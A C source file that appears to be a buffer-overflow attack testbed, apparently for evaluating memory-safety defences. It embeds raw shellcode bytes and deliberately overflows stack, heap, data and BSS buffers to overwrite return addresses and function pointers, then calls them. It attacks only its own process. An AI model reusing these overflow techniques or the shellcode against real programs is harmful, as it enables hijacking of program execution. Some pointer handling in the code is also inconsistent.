#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <setjmp.h>

#include "attack_generator.h"

static char shellcode_no_noop[] =
  "\x17\x05\x00\x00"
  "\x13\x05\xc5\x01"
  "\x93\x05\x10\x24"
  "\x12\x06\x60\x1b"
  "\x93\x06\x00\x00"
  "\x93\x08\x00\x40"
  "\x73\x00\x00\x00"
  "urhacked";

#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

const size_t shellcode_no_noop_size = sizeof(shellcode_no_noop);

ATTACKFORM attack;

CHARPAYLOAD payload;

void fooz() {
  printf("fooz was called\n");
}

struct attackme data_struct = {"AAAAAAAA", &fooz};

struct pointer_struct data_indirect;

void generate_payload() {

  static struct attackme bss_struct = {"AAAAAAAA", &fooz};

  static struct pointer_struct bss_indirect = {"AAAAAAA", NULL};
  
  if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
    payload.overflow_ptr = payload.target_addr = bss_struct.buffer;
    payload.buffer = &bss_struct.func_ptr;
  }
  else if (attack.technique == INDIRECT && attack.location == BSS) {
    payload.buffer = bss_indirect.buf;
    payload.overflow_ptr = ((uintptr_t)(RET_ADDR_PTR) - 0x10);
    payload.target_addr = &bss_indirect.mem_ptr;
  }

  size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);

  char* temp_char_buffer = (char*) malloc(total_size);

  if(temp_char_buffer == NULL) {
    fprintf(stderr, "malloc failed\n");
  }

//  printf("buffer is %x\ntarget is %x\n", payload.buffer, payload.target_addr);

  int overflow_ptr = (int) payload.overflow_ptr;
  memcpy(temp_char_buffer, payload.contents, payload.size);

  char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
  memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
  memcpy(payload.buffer, temp_char_buffer, total_size);

  //we do this so that the compiler doesn't optimize away the memcpy
  printf("%c\n", *((char*) payload.buffer));
}

boolean is_attack_possible() {
  switch(attack.location) {
    case HEAP:
      if((attack.technique == DIRECT) && attack.code_ptr == RET_ADDR) {
        return FALSE;
      }
  }

  return TRUE;
}


void perform_attack(void (*stack_func_ptr_param)()) {  


  char buf[BUFFER_SIZE];

  struct pointer_struct stack_indirect;

  static struct pointer_struct bss_indirect = {"AAAAAAAA", &fooz};

  struct jmp_struct stack_jmp_struct;
  int val_struct;
  val_struct = setjmp(stack_jmp_struct.env_buffer);

  struct pointer_struct* heap_indirect = (struct pointer_struct*) malloc(sizeof(struct pointer_struct));

  struct attackme stack_struct;
  stack_struct.func_ptr = &fooz;

  struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
  heap_struct->func_ptr = &fooz;

  attack.technique = INDIRECT;
  attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
  attack.location = STACK;

  payload.size = shellcode_no_noop_size;


  // set the buffer to be used
  switch(attack.location) {
    case STACK:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
        payload.overflow_ptr = payload.buffer = stack_struct.buffer;
        payload.target_addr = &stack_struct.func_ptr;
      } else if (attack.technique == DIRECT) {
        payload.overflow_ptr = payload.buffer = buf;
        payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      } else {
        payload.buffer = stack_indirect.buf;
        payload.target_addr = &stack_indirect.mem_ptr;
      }
      break;

    case HEAP:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
        payload.overflow_ptr = payload.buffer = heap_struct->buffer;
        payload.target_addr = &heap_struct->func_ptr;
      } else if (attack.technique == DIRECT) {
        payload.overflow_ptr = payload.buffer = malloc(BUFFER_SIZE);
        payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      } else {
        payload.buffer = heap_indirect->buf;
        payload.target_addr = &heap_indirect->mem_ptr;
      }
      break;

    case DATA:
      if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
        payload.overflow_ptr = payload.buffer = data_struct.buffer;
        payload.target_addr = &data_struct.func_ptr;
      } else if (attack.technique == INDIRECT) {
        payload.buffer = data_indirect.buf;
        payload.target_addr = &data_indirect.mem_ptr;
      } else {
        exit(1);
      }
      payload.overflow_ptr = payload.buffer;
      break;
  }

  // if the attack is indirect, set the overflow_ptr appropriately
  if(attack.technique == INDIRECT) {
    switch(attack.code_ptr) {
      case RET_ADDR:
        payload.overflow_ptr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
        break;
      case STRUCT_FUNC_PTR_STACK:
        payload.overflow_ptr = &stack_struct.func_ptr;
        break;
      case STRUCT_FUNC_PTR_HEAP:
        payload.overflow_ptr = &heap_struct->func_ptr;
        break;
      case STRUCT_FUNC_PTR_DATA:
        payload.overflow_ptr = &data_struct.func_ptr;
        break;
      case FUNC_PTR_STACK_PARAM:
        payload.overflow_ptr = &stack_func_ptr_param;
        break;
   }
  }

  payload.contents = shellcode_no_noop;

  generate_payload(&fooz);


  // if the attack is indirect, set the mem_ptr appropriate
  if (attack.technique == INDIRECT && attack.location == STACK) {
    *stack_indirect.mem_ptr = (int) payload.buffer;
    printf("%x\n", *stack_indirect.mem_ptr);
  }


  if (attack.technique == INDIRECT) {
    switch (attack.code_ptr) {
      case STRUCT_FUNC_PTR_STACK:
        stack_struct.func_ptr();
        break;
      case STRUCT_FUNC_PTR_HEAP:
        heap_struct->func_ptr();
        break;
      case STRUCT_FUNC_PTR_DATA:
        data_struct.func_ptr();
        break;
      case FUNC_PTR_STACK_PARAM:
        stack_func_ptr_param();
        break;
    }
  }

  payload.contents = shellcode_no_noop;

  generate_payload(&fooz);
}

int main() {
  perform_attack(&fooz);
}
